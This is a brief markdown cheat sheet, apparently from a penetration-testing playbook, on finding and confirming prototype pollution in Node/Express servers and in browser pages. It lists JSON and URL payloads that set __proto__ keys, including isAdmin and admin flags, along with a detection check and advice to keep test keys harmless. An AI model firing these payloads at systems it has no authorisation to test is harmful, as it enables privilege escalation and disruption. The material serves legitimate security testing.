# Prototype pollution (server + client)

Happens when user input is merged into an object without a key allowlist, letting an
attacker set `__proto__` / `constructor.prototype` and poison every object in the process
(or the page's JS context).

## Server-side (Node/Express, JSON body)

```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__.isAdmin": true}
```

Detect by observing a changed default on a reflected object, or via an OOB side effect:

```json
{"__proto__": {"status": "MARKER"}}
```

## Client-side (URL fragment / JSON in `location` sinks)

```
?__proto__[MARKER]=x
?__proto__.MARKER=x
#__proto__[MARKER]=x
```

Then in `dom-check.js --eval` check `Object.prototype.MARKER`:

```js
({}).MARKER !== undefined || Object.prototype.hasOwnProperty('MARKER')
```

## Confirmation

- **Server:** pollute then trigger a feature that reads the polluted key (e.g. a config
  flag, an auth check) — smallest observable change wins.
- **Client:** use `dom-check.js` `--eval '({}).MARKER'` to confirm the key landed on
  `Object.prototype`.

## Notes

- `Object.freeze(Object.prototype)` / `Object.create(null)` defenses mean the pollute
  silently no-ops — check before claiming.
- Keep keys benign (`MARKER`, `x`) — never `toString`/`hasOwnProperty` overrides that could
  break the target or you'll DoS it by accident.
